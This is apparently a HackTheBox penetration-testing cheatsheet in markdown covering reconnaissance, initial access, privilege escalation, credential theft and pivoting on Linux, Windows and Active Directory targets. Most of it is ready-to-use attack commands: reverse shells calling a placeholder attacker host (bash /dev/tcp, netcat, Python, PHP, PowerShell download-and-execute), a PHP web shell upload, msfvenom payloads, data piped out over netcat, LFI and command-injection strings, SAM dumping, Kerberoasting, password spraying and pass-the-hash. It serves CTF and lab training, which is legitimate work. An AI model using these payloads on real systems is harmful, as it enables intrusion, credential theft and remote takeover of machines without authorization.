# HackTheBox Linux & Windows Cheatsheet

<p align="center">
  <img src="images/htb.png"/>
</p>

A practical HackTheBox methodology cheatsheet split by Linux and Windows targets. Use only on HTB, CTF labs, your own machines, or systems where you have explicit authorization.

## Table of Contents

- [Quick Workflow](#quick-workflow)
- [Setup](#setup)
- [Reconnaissance](#reconnaissance)
  - [Host Discovery](#host-discovery)
  - [Nmap](#nmap)
  - [Service Fingerprinting](#service-fingerprinting)
  - [Web Enumeration](#web-enumeration)
  - [DNS Enumeration](#dns-enumeration)
- [Linux Targets](#linux-targets)
  - [Linux Initial Access Checklist](#linux-initial-access-checklist)
  - [Linux Common Services](#linux-common-services)
  - [Linux Web Vectors](#linux-web-vectors)
  - [Linux Shells](#linux-shells)
  - [Linux File Transfer](#linux-file-transfer)
  - [Linux Stabilization](#linux-stabilization)
  - [Linux Local Enumeration](#linux-local-enumeration)
  - [Linux Privilege Escalation](#linux-privilege-escalation)
  - [Linux Credential Hunting](#linux-credential-hunting)
  - [Linux Post-Exploitation Notes](#linux-post-exploitation-notes)
- [Windows Targets](#windows-targets)
  - [Windows Initial Access Checklist](#windows-initial-access-checklist)
  - [Windows Common Services](#windows-common-services)
  - [Windows Web Vectors](#windows-web-vectors)
  - [Windows Shells](#windows-shells)
  - [Windows File Transfer](#windows-file-transfer)
  - [Windows Local Enumeration](#windows-local-enumeration)
  - [Windows Privilege Escalation](#windows-privilege-escalation)
  - [Windows Credential Hunting](#windows-credential-hunting)
  - [Active Directory](#active-directory)
  - [Windows Post-Exploitation Notes](#windows-post-exploitation-notes)
- [Password Cracking](#password-cracking)
- [Port Forwarding and Pivoting](#port-forwarding-and-pivoting)
- [Useful Wordlists](#useful-wordlists)
- [References](#references)

## Quick Workflow

1. Add target to `/etc/hosts` when a hostname is discovered.
2. Run fast TCP scan, full TCP scan, then targeted UDP when needed.
3. Enumerate every open service before exploiting.
4. For web services, check technologies, vhosts, directories, parameters, uploads, and source leaks.
5. Get a foothold with the lowest-impact working path.
6. Stabilize shell and collect local system context.
7. Run manual local enumeration before relying on automated scripts.
8. Escalate to `root`, `Administrator`, `SYSTEM`, or domain admin depending on machine goal.
9. Capture `user.txt` and `root.txt` / `administrator` flag.
10. Write down credentials, paths, ports, and assumptions as you go.

## Setup

```sh
export IP=<TARGET_IP>
export HOST=<TARGET_HOSTNAME>
mkdir -p scans loot exploits www
```

```sh
sudo sh -c 'echo "<TARGET_IP> <TARGET_HOSTNAME>" >> /etc/hosts'
```

Common local listeners:

```sh
nc -lvnp 4444
rlwrap -cAr nc -lvnp 4444
python3 -m http.server 8000
sudo responder -I tun0
```

## Reconnaissance

### Host Discovery

```sh
ping -c 1 $IP
sudo arp-scan -l
fping -a -g 10.10.10.0/24 2>/dev/null
```

If ICMP is blocked, rely on port scans.

### Nmap

Fast initial scan:

```sh
nmap -p- --min-rate 5000 -oA scans/alltcp $IP
```

Targeted scripts and versions:

```sh
ports=$(grep -oP '\d+/open' scans/alltcp.gnmap | cut -d/ -f1 | paste -sd, -)
nmap -sCV -p "$ports" -oA scans/tcpscripts $IP
```

Useful variations:

```sh
nmap -sU --top-ports 100 -oA scans/udp-top100 $IP
nmap -A -p "$ports" -oA scans/aggressive $IP
nmap --script vuln -p "$ports" -oA scans/vuln $IP
```

### Service Fingerprinting

```sh
nc -nv $IP <PORT>
curl -i http://$IP/
openssl s_client -connect $IP:443 -servername $HOST
whatweb http://$IP/
searchsploit <service> <version>
```

### Web Enumeration

```sh
whatweb http://$HOST/
nikto -host http://$HOST/
feroxbuster -u http://$HOST/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u http://$HOST/FUZZ
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://$HOST/ -H 'Host: FUZZ.<DOMAIN>' -fs <SIZE>
```

Common checks:

```sh
curl -i http://$HOST/robots.txt
curl -i http://$HOST/sitemap.xml
curl -i http://$HOST/.git/HEAD
gobuster dir -u http://$HOST/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js,bak,zip
```

Parameter fuzzing:

```sh
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://$HOST/index.php?FUZZ=test' -fs <SIZE>
```

### DNS Enumeration

```sh
dig @$IP $HOST any
dig axfr @$IP $HOST
dnsrecon -d $HOST -n $IP
dnsenum --dnsserver $IP $HOST
```

## Linux Targets

### Linux Initial Access Checklist

- SSH: usernames, keys, weak/default credentials, reused passwords.
- FTP: anonymous login, writable directories, backup files.
- SMB/NFS: readable shares, writable shares, config files, keys.
- Web: LFI/RFI, upload bypass, command injection, SSTI, SQLi, deserialization.
- Databases: default credentials, local-only services exposed through web or pivot.
- Scheduled jobs and writable scripts after foothold.

### Linux Common Services

#### SSH - 22

```sh
ssh -o PreferredAuthentications=password <USER>@$IP
ssh -i id_rsa <USER>@$IP
ssh -L 8080:127.0.0.1:80 <USER>@$IP
```

```sh
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ssh://$IP
```

#### FTP - 21

```sh
ftp anonymous@$IP
nmap --script ftp-anon,ftp-syst,ftp-vsftpd-backdoor -p21 $IP
wget -m ftp://anonymous:anonymous@$IP/
```

#### SMB on Linux/Samba - 139,445

```sh
smbclient -L //$IP/ -N
smbmap -H $IP
smbmap -H $IP -u <USER> -p <PASS>
smbclient //$IP/<SHARE> -N
nmap --script smb-enum-shares,smb-enum-users -p445 $IP
```

#### NFS - 2049

```sh
showmount -e $IP
mkdir -p /tmp/nfs
sudo mount -t nfs $IP:/<EXPORT> /tmp/nfs -o nolock
find /tmp/nfs -ls
```

If `no_root_squash` is enabled, root-owned file creation may be useful in CTF labs.

#### Redis - 6379

```sh
redis-cli -h $IP info
redis-cli -h $IP keys '*'
redis-cli -h $IP get <KEY>
```

#### MySQL / MariaDB - 3306

```sh
mysql -h $IP -u root -p
mysql -h $IP -u <USER> -p<PASS> -e 'show databases;'
nmap --script mysql-info,mysql-users,mysql-databases -p3306 $IP
```

#### PostgreSQL - 5432

```sh
psql -h $IP -U postgres
psql -h $IP -U <USER> -d <DB>
nmap --script pgsql-brute -p5432 $IP
```

### Linux Web Vectors

#### LFI

```text
?page=/etc/passwd
?page=../../../../etc/passwd
?page=php://filter/convert.base64-encode/resource=index.php
```

Files to try:

```text
/etc/passwd
/etc/hosts
/etc/crontab
/proc/self/environ
/proc/self/cmdline
/home/<user>/.ssh/id_rsa
/var/www/html/config.php
```

#### Command Injection

```text
;id
&& id
| id
`id`
$(id)
%0Aid
```

#### SQL Injection

```sh
sqlmap -u 'http://$HOST/page.php?id=1' --batch --dbs
sqlmap -u 'http://$HOST/page.php?id=1' -D <DB> --tables --batch
sqlmap -u 'http://$HOST/page.php?id=1' -D <DB> -T <TABLE> --dump --batch
```

#### SSTI Quick Tests

```text
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
```

#### Upload Bypass Ideas

```text
shell.php
shell.php5
shell.phtml
shell.php.jpg
shell.phar
Content-Type: image/png
GIF89a;<?php system($_GET['cmd']); ?>
```

### Linux Shells

#### Bash

```sh
bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
```

#### Netcat

```sh
nc -e /bin/sh <LHOST> <LPORT>
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f
```

#### Python

```sh
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<LHOST>",<LPORT>));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
```

#### PHP

```sh
php -r '$s=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

#### Socat

Attacker:

```sh
socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>
```

Target:

```sh
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT>
```

### Linux File Transfer

From attacker to target:

```sh
python3 -m http.server 8000
wget http://<LHOST>:8000/linpeas.sh -O /tmp/linpeas.sh
curl http://<LHOST>:8000/linpeas.sh -o /tmp/linpeas.sh
```

Using netcat:

```sh
# attacker receiver
nc -lvnp 9001 > loot.tar.gz
# target sender
tar czf - /path/to/loot | nc <LHOST> 9001
```

Base64 fallback:

```sh
base64 -w0 file.bin
printf '<BASE64>' | base64 -d > file.bin
```

### Linux Stabilization

```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 40 cols 120
```

Then press `Ctrl+Z` locally:

```sh
stty raw -echo; fg
```

### Linux Local Enumeration

Identity and system:

```sh
id
whoami
hostname
uname -a
cat /etc/os-release
sudo -l
```

Users and groups:

```sh
cat /etc/passwd
cat /etc/group
lastlog
w
```

Network:

```sh
ip addr
ip route
ss -tulpn
cat /etc/hosts
```

Processes and timers:

```sh
ps auxww
systemctl list-timers
systemctl list-units --type=service --state=running
```

Filesystems:

```sh
mount
findmnt
lsblk
df -h
```

Automated helpers:

```sh
chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh
chmod +x /tmp/pspy64 && /tmp/pspy64
```

### Linux Privilege Escalation

#### Sudo Rights

```sh
sudo -l
sudo -u <USER> <COMMAND>
```

Check GTFOBins for allowed commands.

#### SUID / SGID

```sh
find / -perm -4000 -type f -ls 2>/dev/null
find / -perm -2000 -type f -ls 2>/dev/null
```

#### Capabilities

```sh
getcap -r / 2>/dev/null
```

Interesting examples include `cap_setuid+ep`, `cap_dac_read_search+ep`, and `cap_sys_admin+ep`.

#### Writable Paths

```sh
find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys|^/dev'
find / -writable -type f 2>/dev/null | grep -vE '^/proc|^/sys|^/dev'
```

#### Cron Jobs

```sh
cat /etc/crontab
ls -la /etc/cron.*
grep -R "" /etc/cron* 2>/dev/null
```

#### PATH Hijacking

```sh
echo $PATH
strings <SUID_BINARY>
```

If a privileged script or binary calls a relative command from a writable directory, place a controlled executable earlier in `PATH`.

#### Wildcard Abuse

```sh
ls -la /etc/cron* /opt /backup 2>/dev/null
```

Look for cron scripts using unsafe patterns like `tar *` in writable directories.

#### Kernel Exploits

```sh
uname -a
searchsploit linux kernel <VERSION>
```

Use kernel exploits as a last resort in HTB after confirming architecture and OS version.

#### Docker / LXC Groups

```sh
groups
id
ls -la /var/run/docker.sock
```

```sh
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

#### NFS no_root_squash

```sh
cat /etc/exports 2>/dev/null
showmount -e <TARGET>
```

### Linux Credential Hunting

```sh
grep -RniE 'pass|password|passwd|pwd|secret|token|key' /var/www /opt /home 2>/dev/null
find /home -name 'id_rsa' -o -name '*.kdbx' -o -name '*.ovpn' 2>/dev/null
find / -name '*.conf' -o -name '*.config' -o -name '.env' 2>/dev/null
cat ~/.bash_history 2>/dev/null
cat ~/.mysql_history 2>/dev/null
```

Interesting locations:

```text
/var/www/html
/opt
/srv
/home/*
/backups
/etc/passwd
/etc/shadow
/etc/crontab
/etc/systemd/system
/var/log
```

### Linux Post-Exploitation Notes

```sh
cat /home/*/user.txt 2>/dev/null
cat /root/root.txt 2>/dev/null
```

Loot carefully:

```sh
hostname; id; ip addr; sudo -l
```

## Windows Targets

### Windows Initial Access Checklist

- SMB: anonymous shares, readable backups, writable shares, reused credentials.
- WinRM: valid credentials to shell with Evil-WinRM.
- RDP: valid credentials, password reuse, exposed desktop apps.
- MSSQL: weak credentials, `xp_cmdshell`, linked servers.
- IIS/web: upload bugs, ASPX shells, config disclosure, SQLi.
- Active Directory: Kerberos, LDAP, SMB, RPC, DNS, certificate services.

### Windows Common Services

#### SMB - 139,445

```sh
smbclient -L //$IP/ -N
smbmap -H $IP
smbmap -H $IP -u <USER> -p <PASS>
crackmapexec smb $IP
crackmapexec smb $IP -u <USER> -p <PASS> --shares
nmap --script smb-enum-shares,smb-enum-users,smb-os-discovery -p445 $IP
```

Download recursively:

```sh
smbclient //$IP/<SHARE> -U '<USER>%<PASS>'
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
```

#### RPC - 135

```sh
rpcclient -U '' -N $IP
rpcclient -U '<USER>%<PASS>' $IP
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> queryuser <RID>
```

#### LDAP - 389,636,3268,3269

```sh
ldapsearch -x -H ldap://$IP -s base namingcontexts
ldapsearch -x -H ldap://$IP -D '<DOMAIN>\<USER>' -w '<PASS>' -b 'DC=example,DC=local'
```

#### Kerberos - 88

```sh
kerbrute userenum -d <DOMAIN> --dc $IP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
GetNPUsers.py <DOMAIN>/ -usersfile users.txt -dc-ip $IP -no-pass
GetUserSPNs.py <DOMAIN>/<USER>:<PASS> -dc-ip $IP -request
```

#### WinRM - 5985,5986

```sh
crackmapexec winrm $IP -u <USER> -p <PASS>
evil-winrm -i $IP -u <USER> -p <PASS>
evil-winrm -i $IP -u <USER> -H <NTLM_HASH>
```

#### RDP - 3389

```sh
nmap --script rdp-enum-encryption -p3389 $IP
xfreerdp /v:$IP /u:<USER> /p:<PASS> /cert:ignore
```

#### MSSQL - 1433

```sh
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-config -p1433 $IP
crackmapexec mssql $IP -u <USER> -p <PASS>
impacket-mssqlclient <DOMAIN>/<USER>:<PASS>@$IP -windows-auth
```

Inside MSSQL:

```sql
select @@version;
select name from master..sysdatabases;
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

### Windows Web Vectors

Common IIS extensions:

```text
.aspx
.asp
.config
.txt
.zip
.bak
.old
```

IIS/web.config disclosure paths:

```text
/web.config
/backup.zip
/site.zip
/app_offline.htm
```

ASPX test shell pattern:

```aspx
<%@ Page Language="C#" %><% Response.Write(System.Security.Principal.WindowsIdentity.GetCurrent().Name); %>
```

Upload and execution checks:

```sh
curl -i -F 'file=@shell.aspx' http://$HOST/upload
curl -i http://$HOST/uploads/shell.aspx
```

### Windows Shells

#### PowerShell Reverse Shell

Generate with revshells or Nishang when allowed in the lab, then host locally:

```sh
python3 -m http.server 8000
```

On target:

```powershell
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>:8000/shell.ps1')"
```

#### Netcat

```cmd
nc.exe -e cmd.exe <LHOST> <LPORT>
```

#### Nishang

```powershell
Import-Module .\Invoke-PowerShellTcp.ps1
Invoke-PowerShellTcp -Reverse -IPAddress <LHOST> -Port <LPORT>
```

#### Meterpreter Payloads

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell-x86.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell-x64.exe
msfvenom -p windows/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o meterpreter-x86.exe
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o meterpreter-x64.exe
```

### Windows File Transfer

#### PowerShell

```powershell
iwr -uri http://<LHOST>:8000/winpeas.exe -OutFile C:\Windows\Temp\winpeas.exe
(New-Object Net.WebClient).DownloadFile('http://<LHOST>:8000/nc.exe','C:\Windows\Temp\nc.exe')
```

#### Certutil

```cmd
certutil -urlcache -f http://<LHOST>:8000/file.exe C:\Windows\Temp\file.exe
```

#### SMB Server from Attacker

```sh
impacket-smbserver share . -smb2support
```

On target:

```cmd
copy \\<LHOST>\share\winpeas.exe C:\Windows\Temp\winpeas.exe
```

With credentials:

```sh
impacket-smbserver share . -smb2support -username user -password pass
```

```cmd
net use \\<LHOST>\share /user:user pass
copy \\<LHOST>\share\file.exe .
```

#### Base64

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\path\file.exe'))
[IO.File]::WriteAllBytes('C:\path\file.exe',[Convert]::FromBase64String('<BASE64>'))
```

### Windows Local Enumeration

Identity and system:

```cmd
whoami
whoami /priv
whoami /groups
hostname
systeminfo
ipconfig /all
route print
netstat -ano
```

Users and groups:

```cmd
net user
net localgroup
net localgroup administrators
net user <USER>
```

PowerShell equivalents:

```powershell
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember Administrators
Get-ComputerInfo
Get-NetTCPConnection
```

Services and processes:

```cmd
tasklist /svc
sc query
wmic service get name,displayname,pathname,startmode
```

Automated helpers:

```cmd
C:\Windows\Temp\winpeas.exe
```

```powershell
. .\PowerUp.ps1
Invoke-AllChecks
. .\Seatbelt.exe all
```

### Windows Privilege Escalation

#### Privileges

```cmd
whoami /priv
```

Interesting privileges:

```text
SeImpersonatePrivilege
SeAssignPrimaryTokenPrivilege
SeBackupPrivilege
SeRestorePrivilege
SeDebugPrivilege
SeTakeOwnershipPrivilege
```

Common CTF tools for impersonation paths include JuicyPotato, RoguePotato, PrintSpoofer, and GodPotato. Match the tool to OS version and available privileges.

#### Unquoted Service Paths

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v '"'
```

#### Weak Service Permissions

```cmd
sc qc <SERVICE>
sc sdshow <SERVICE>
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv <USER> *
```

Replace binary path:

```cmd
sc config <SERVICE> binPath= "C:\Windows\Temp\shell.exe"
sc stop <SERVICE>
sc start <SERVICE>
```

#### AlwaysInstallElevated

```cmd
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o shell.msi
```

```cmd
msiexec /quiet /qn /i C:\Windows\Temp\shell.msi
```

#### Scheduled Tasks

```cmd
schtasks /query /fo LIST /v
icacls C:\path\to\task\binary.exe
```

#### Writable Startup Paths

```cmd
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
icacls "C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
```

#### DLL Hijacking

Look for writable application directories and missing DLL loads with ProcMon when GUI access is available. In HTB, service binaries in writable directories are common clues.

### Windows Credential Hunting

Files:

```cmd
dir /s /b *pass* *cred* *config* *.kdbx *.txt *.ini 2>nul
dir /s /b C:\Users\*.txt C:\Users\*.kdbx C:\Users\*.config 2>nul
```

Registry:

```cmd
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

PowerShell history:

```powershell
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Common locations:

```text
C:\Users\<USER>\Desktop
C:\Users\<USER>\Documents
C:\Users\<USER>\Downloads
C:\inetpub\wwwroot
C:\Program Files
C:\Program Files (x86)
C:\ProgramData
C:\Windows\Temp
```

Stored credentials:

```cmd
cmdkey /list
runas /savecred /user:<USER> cmd.exe
```

SAM and SYSTEM if readable:

```cmd
reg save HKLM\SAM C:\Windows\Temp\SAM
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
```

```sh
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

### Active Directory

#### Domain Context

```cmd
whoami /fqdn
whoami /user
net config workstation
nltest /dsgetdc:<DOMAIN>
echo %USERDNSDOMAIN%
echo %LOGONSERVER%
```

```powershell
Get-ADDomain
Get-ADUser -Filter *
Get-ADGroup -Filter *
```

If RSAT is unavailable, use PowerView.

#### BloodHound

```sh
bloodhound-python -d <DOMAIN> -u <USER> -p <PASS> -ns $IP -c all
```

On Windows:

```powershell
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain <DOMAIN> -ZipFileName loot.zip
```

#### AS-REP Roasting

```sh
GetNPUsers.py <DOMAIN>/ -dc-ip $IP -usersfile users.txt -no-pass
GetNPUsers.py <DOMAIN>/<USER>:<PASS> -dc-ip $IP -request
```

Crack:

```sh
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt asrep.hashes
```

#### Kerberoasting

```sh
GetUserSPNs.py <DOMAIN>/<USER>:<PASS> -dc-ip $IP -request -outputfile kerberoast.hashes
hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt
```

#### Password Spraying

```sh
crackmapexec smb $IP -u users.txt -p '<PASSWORD>' --continue-on-success
kerbrute passwordspray -d <DOMAIN> --dc $IP users.txt '<PASSWORD>'
```

Avoid spraying real environments without explicit permission and lockout awareness. In HTB labs, still keep attempts controlled.

#### Pass-the-Hash

```sh
crackmapexec smb $IP -u <USER> -H <NTLM_HASH>
evil-winrm -i $IP -u <USER> -H <NTLM_HASH>
psexec.py <DOMAIN>/<USER>@$IP -hashes :<NTLM_HASH>
wmiexec.py <DOMAIN>/<USER>@$IP -hashes :<NTLM_HASH>
```

#### Secrets Dumping

```sh
secretsdump.py <DOMAIN>/<USER>:<PASS>@$IP
secretsdump.py <DOMAIN>/<USER>@$IP -hashes :<NTLM_HASH>
```

#### AD CS Quick Checks

```sh
certipy find -u <USER>@<DOMAIN> -p '<PASS>' -dc-ip $IP -vulnerable -stdout
certipy find -u <USER>@<DOMAIN> -p '<PASS>' -dc-ip $IP -vulnerable -text
```

#### Common AD Files to Loot

```text
Groups.xml
Services.xml
ScheduledTasks.xml
Printers.xml
Registry.xml
SYSVOL scripts
*.kdbx
*.ps1
*.bat
*.config
```

```sh
smbclient //$IP/SYSVOL -U '<DOMAIN>/<USER>%<PASS>'
```

### Windows Post-Exploitation Notes

```cmd
type C:\Users\*\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

```powershell
Get-ChildItem C:\Users -Recurse -Filter user.txt -ErrorAction SilentlyContinue
Get-ChildItem C:\Users -Recurse -Filter root.txt -ErrorAction SilentlyContinue
```

## Password Cracking

### John the Ripper

```sh
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=<FORMAT> --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
```

### Hashcat

```sh
hashcat -m <MODE> hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m <MODE> hash.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
hashcat --show -m <MODE> hash.txt
```

Common modes:

```text
0      MD5
100    SHA1
1400   SHA2-256
1700   SHA2-512
3200   bcrypt
1000   NTLM
5600   NetNTLMv2
13100  Kerberos 5 TGS-REP
18200  Kerberos 5 AS-REP
22000  WPA/WPA2
```

### Hash Identification

```sh
hashid hash.txt
haiti '<HASH>'
name-that-hash -t '<HASH>'
```

### SSH Keys

```sh
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

### KeePass

```sh
keepass2john database.kdbx > keepass.hash
john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash
```

### Zip / 7z

```sh
zip2john file.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
7z2john file.7z > 7z.hash
john --wordlist=/usr/share/wordlists/rockyou.txt 7z.hash
```

## Port Forwarding and Pivoting

### SSH Local Forward

```sh
ssh -L <LOCAL_PORT>:127.0.0.1:<REMOTE_PORT> <USER>@$IP
```

### SSH Dynamic SOCKS

```sh
ssh -D 1080 <USER>@$IP
proxychains nmap -sT -Pn -p <PORT> <INTERNAL_IP>
```

### Chisel

Attacker:

```sh
./chisel server -p 4444 --reverse
```

Target:

```sh
./chisel client <LHOST>:4444 R:socks
./chisel client <LHOST>:4444 R:<LPORT>:<RHOST>:<RPORT>
```

### Ligolo-ng

Attacker:

```sh
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert
```

Target:

```sh
./agent -connect <LHOST>:11601 -ignore-cert
```

Proxy console:

```text
session
ifconfig
start
```

Add route locally:

```sh
sudo ip route add <INTERNAL_CIDR> dev ligolo
```

### Socat Forward

```sh
socat TCP-LISTEN:<LPORT>,fork,reuseaddr TCP:<RHOST>:<RPORT>
```

## Useful Wordlists

```text
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

## References

- Hack The Box Cheat Sheets: https://www.hackthebox.com/resources/cheat-sheets
- HackTricks: https://book.hacktricks.xyz/
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- GTFOBins: https://gtfobins.github.io/
- LOLBAS: https://lolbas-project.github.io/
- PEASS-ng: https://github.com/peass-ng/PEASS-ng
- InternalAllTheThings: https://github.com/swisskyrepo/InternalAllTheThings
- Active Directory Exploitation Cheat Sheet: https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet
- Impacket: https://github.com/fortra/impacket
- CrackMapExec / NetExec-style workflows: https://www.netexec.wiki/
